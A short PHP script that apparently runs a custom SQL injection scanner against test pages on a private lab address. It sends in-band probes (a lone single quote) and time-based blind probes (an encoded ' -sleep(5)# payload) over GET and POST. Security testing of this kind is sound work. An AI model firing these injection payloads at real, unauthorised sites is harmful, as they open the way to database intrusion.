<?php
    require_once './SqliScanner.php';

    $inband_get = new SqliScanner();
    $inband_get->setUrl('http://192.168.1.21:8000/inband/getmethod.php');
    $inband_get->setMethod('get');
    $inband_get->setPayload("?id='");
    $inband_get->setType('inband');
    $inband_get->execute();

    $inband_post = new SqliScanner();
    $inband_post->setUrl('http://192.168.1.21:8000/inband/postmethod.php');
    $inband_post->setMethod('post');
    $inband_post->setType('inband');
    $inband_post->setOption("id='");
    $inband_post->execute();

    $blind_get = new SqliScanner();
    $blind_get->setUrl('http://192.168.1.21:8000/blind/getmethod.php');
    $blind_get->setMethod('get');
    $blind_get->setPayload("?id=%27-sleep%285%29%23#");
    $blind_get->setType('blind');
    $blind_get->execute();

    $inband_post = new SqliScanner();
    $inband_post->setUrl('http://192.168.1.21:8000/blind/postmethod.php');
    $inband_post->setMethod('post');
    $inband_post->setType('blind');
    $inband_post->setOption("id=%27-sleep%285%29%23#");
    $inband_post->execute();